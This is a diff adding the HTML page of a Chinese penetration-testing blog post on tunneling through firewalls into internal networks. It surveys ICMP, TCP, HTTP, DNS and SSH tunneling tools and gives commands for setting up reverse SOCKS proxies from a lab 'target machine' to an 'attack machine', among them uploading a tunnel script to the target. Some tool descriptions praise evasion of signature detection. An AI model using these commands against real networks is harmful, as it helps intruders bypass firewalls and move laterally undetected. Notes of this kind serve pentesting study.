@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Penertration,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="记录内网穿透的一些知识">
+<meta name="keywords" content="Penertration">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网穿透">
+<meta property="og:url" content="https://tyaoo.github.io/2021/05/12/内网穿透/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="记录内网穿透的一些知识">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-05-13T04:59:37.178Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网穿透">
+<meta name="twitter:description" content="记录内网穿透的一些知识">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://tyaoo.github.io/2021/05/12/内网穿透/">
+
+
+
+
+
+  <title>内网穿透 | Tyaoo's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tyaoo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2021/05/12/内网穿透/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网穿透</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-05-12T20:38:28+08:00">
+                2021-05-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>记录内网穿透的一些知识</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>内网穿透</strong></p>
+<p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p>
+<p><strong>隧道技术</strong></p>
+<p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
+<p><strong>隧道分类</strong></p>
+<ul>
+<li>网络层隧道：ICMP等</li>
+<li>传输层隧道：TCP、UDP等</li>
+<li>应用层隧道：HTTP、DNS、SSH、RDP等</li>
+</ul>
+<p><strong>实战环境</strong></p>
+<p>在实战环境中，我们要考虑目标机器的出入网情况，有可能只允许ICMP出入网，抑或是只允许HTTP出网，我们需要视特定情况选择对应的隧道，选择反弹shell、代理或者端口转发，选择正向代理或者反向代理等等。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>目标机器：</p>
+<ul>
+<li>Win7</li>
+<li>192.168.22.3（内）</li>
+<li>192.168.33.4（外）</li>
+</ul>
+<p>攻击机器：</p>
+<ul>
+<li>Linux</li>
+<li>192.168.44.5（外）</li>
+</ul>
+<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><blockquote>
+<p><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
+<p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用</p>
+</blockquote>
+<h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><blockquote>
+<p><a href="https://github.com/DhavalKapil/icmptunnel" target="_blank" rel="noopener">https://github.com/DhavalKapil/icmptunnel</a></p>
+<p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p>
+</blockquote>
+<h3 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h3><blockquote>
+<p><a href="https://github.com/esrrhs/pingtunnel" target="_blank" rel="noopener">https://github.com/esrrhs/pingtunnel</a></p>
+<p>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p>
+</blockquote>
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> (可选)关闭系统默认的 ping</span></span><br><span class="line">echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">./pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
+
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 转发TCP</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -t server_ip:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 转发sock5</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><blockquote>
+<p><a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat/</a></p>
+<p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p>
+</blockquote>
+<h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><blockquote>
+<p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a></p>
+<p>powershell版的netcat</p>
+</blockquote>
+<h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><blockquote>
+<p><a href="https://github.com/3ndG4me/socat" target="_blank" rel="noopener">https://github.com/3ndG4me/socat</a></p>
+<p>具有记录转发流的功能，方便查看转发内容，需要安装</p>
+</blockquote>
+<h3 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h3><blockquote>
+<p>windows系统自带的网络配置工具</p>
+</blockquote>
+<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h3><blockquote>
+<p><a href="https://github.com/windworst/LCX" target="_blank" rel="noopener">https://github.com/windworst/LCX</a></p>
+<p>端口转发工具</p>
+</blockquote>
+<h3 id="NATBypass"><a href="#NATBypass" class="headerlink" title="NATBypass"></a>NATBypass</h3><blockquote>
+<p><a href="https://github.com/cw1997/NATBypass" target="_blank" rel="noopener">https://github.com/cw1997/NATBypass</a></p>
+<p>一款lcx在golang下的实现，更好的跨平台，更完善的文档</p>
+</blockquote>
+<h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><blockquote>
+<p><a href="https://github.com/EddieIvan01/iox" target="_blank" rel="noopener">https://github.com/EddieIvan01/iox</a></p>
+<p>端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。</p>
+<p>缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p>
+</blockquote>
+<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><blockquote>
+<p><a href="https://github.com/rootkiter/EarthWorm" target="_blank" rel="noopener">https://github.com/rootkiter/EarthWorm</a></p>
+<p>十分方便的多级SOCKS代理，已经永久停止更新</p>
+</blockquote>
+<p><strong>正向连接</strong></p>
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p><strong>反向连接</strong></p>
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>
+
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.44.5 -e 1234</span><br></pre></td></tr></table></figure>
+
+<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><blockquote>
+<p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p>
+</blockquote>
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k 123456</span><br></pre></td></tr></table></figure>
+
+<p>上传对应的<code>tunnel.(aspx|ashx|jsp|php)</code>文件到目标机上</p>
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k 123456 -u http://192.168.33.4/tunnel.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h3><blockquote>
+<p><a href="https://github.com/Dliv3/Venom" target="_blank" rel="noopener">https://github.com/Dliv3/Venom</a></p>
+<p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p>
+</blockquote>
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>
+
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 192.168.44.5 -rport 9999</span><br></pre></td></tr></table></figure>
+
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 6666</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssf"><a href="#ssf" class="headerlink" title="ssf"></a>ssf</h3><blockquote>
+<p><a href="https://github.com/securesocketfunneling/ssf" target="_blank" rel="noopener">https://github.com/securesocketfunneling/ssf</a></p>
+<p>支持TLS隧道</p>
+</blockquote>
+<p><strong>正向连接</strong></p>
+<p>把certs文件夹和ssfd上传到目标机上</p>
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssfd.exe ‐p 1333</span><br></pre></td></tr></table></figure>
+
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssfd ‐D 1222 ‐p 1333 192.168.33.4</span><br></pre></td></tr></table></figure>
+
+<p><strong>反向连接</strong></p>
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssfd ‐p 1234</span><br></pre></td></tr></table></figure>
+
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssf.exe ‐F 12345 ‐p 1234 192.168.44.5</span><br></pre></td></tr></table></figure>
+
+<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><blockquote>
+<p><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p>
+<p>支持 TCP、UDP、HTTP、HTTPS 等多种协议</p>
+</blockquote>
+<p>攻击机上配置frps.ini</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 6666</span><br></pre></td></tr></table></figure>
+
+<p>攻击机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<p>目标及配置frpc.ini</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.33.4</span><br><span class="line">server_port = 6666</span><br><span class="line">[http_proxy]</span><br><span class="line">type=tcp</span><br><span class="line">remote_port=7777</span><br><span class="line">plugin=socks5</span><br></pre></td></tr></table></figure>
+
+<p>目标机上：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><blockquote>
+<p><a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a></p>
+<p>可支持任何tcp、udp上层协议，还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端</p>
+</blockquote>
+<h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><blockquote>
+<p><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a></p>
+<p>不仅可以创建DNS隧道，更是C2</p>
+</blockquote>
+<h3 id="dnscat2-powershell"><a href="#dnscat2-powershell" class="headerlink" title="dnscat2-powershell"></a>dnscat2-powershell</h3><blockquote>
+<p><a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></p>
+<p>dnscat2的powershell客户端</p>
+</blockquote>
+<h3 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a>dns2tcp</h3><blockquote>
+<p><a href="https://github.com/alex-sector/dns2tcp" target="_blank" rel="noopener">https://github.com/alex-sector/dns2tcp</a></p>
+<p>TCP over DNS，即通过DNS隧道转发TCP连接</p>
+</blockquote>
+<h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><blockquote>
+<p><a href="https://github.com/yarrick/iodine" target="_blank" rel="noopener">https://github.com/yarrick/iodine</a></p>
+<p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包</p>
+</blockquote>
+<h3 id="reDuh"><a href="#reDuh" class="headerlink" title="reDuh"></a>reDuh</h3><blockquote>
+<p><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">https://github.com/sensepost/reDuh</a></p>
+<p>TCP over HTTP，即通过HTTP隧道转发TCP连接，隧道不稳定</p>
+</blockquote>
+<h3 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a>Tunna</h3><blockquote>
+<p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p>
+<p>TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定</p>
+</blockquote>
+<h3 id="ABPTTS"><a href="#ABPTTS" class="headerlink" title="ABPTTS"></a>ABPTTS</h3><blockquote>
+<p><a href="https://github.com/nccgroup/ABPTTS" target="_blank" rel="noopener">https://github.com/nccgroup/ABPTTS</a></p>
+<p>TCP over HTTP，即通过HTTP隧道转发TCP连接，数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp</p>
+</blockquote>
+<h3 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h3><blockquote>
+<p><a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a></p>
+<p>EarthWorm的升级版，已经永久停止更新</p>
+</blockquote>
+<h3 id="ssocks"><a href="#ssocks" class="headerlink" title="ssocks"></a>ssocks</h3><blockquote>
+<p><a href="https://github.com/54Pany/sSocks" target="_blank" rel="noopener">https://github.com/54Pany/sSocks</a></p>
+<p>正向和反向的socks工具，可执行文件的大小很小</p>
+</blockquote>
+<h3 id="s5-go"><a href="#s5-go" class="headerlink" title="s5.go"></a>s5.go</h3><blockquote>
+<p><a href="https://github.com/ring04h/s5.go" target="_blank" rel="noopener">https://github.com/ring04h/s5.go</a></p>
+<p>go语言编写的socks服务工具，良好的跨平台特性</p>
+</blockquote>
+<h3 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h3><blockquote>
+<p><a href="https://github.com/luizluca/bridge" target="_blank" rel="noopener">https://github.com/luizluca/bridge</a></p>
+<p>基于http协议的端口转发</p>
+</blockquote>
+<h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><blockquote>
+<p>这里分享个小技巧，如果已经连上了ssh，可以输入~C来执行ssh命令</p>
+</blockquote>
+<p>本地端口转发：</p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -L 本地网卡地址:本地端口:目标地址:目标端口</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者省略本地网卡地址</span></span><br><span class="line">ssh -CNfg -L 7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到114.114.114.114:9999</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即本地机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问远程的114.114.114.114:9999</span></span><br></pre></td></tr></table></figure>
+
+<p>远程端口转发：</p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -R 远程网卡地址:远程端口:目标地址:目标端口</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者省略远程网卡地址</span></span><br><span class="line">ssh -CNfg -R 7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即远程机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问本地的114.114.114.114:9999</span></span><br></pre></td></tr></table></figure>
+
+<p>动态端口转发：</p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -D 本地网卡地址:本地端口</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即远程机器在设置127.0.0.1:7777的socks5代理后可以通过192.168.1.1的ssh隧道访问本地服务</span></span><br></pre></td></tr></table></figure>
+
+<p>构建ssh隧道的常用参数:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输，提高传输速度</span><br><span class="line">-f 后台执行数据传输</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发，即SOCKS代理</span><br><span class="line">-p 指定ssh连接端口</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9454" target="_blank" rel="noopener">内网穿透的n种姿势</a></p>
+<p><a href="https://xz.aliyun.com/t/7701" target="_blank" rel="noopener">内网渗透之内网穿透</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Penertration/" rel="tag"># Penertration</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/28/babyvm-vm逆向/" rel="next" title="babyvm-vm逆向">
+                <i class="fa fa-chevron-left"></i> babyvm-vm逆向
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Tyaoo">
+            
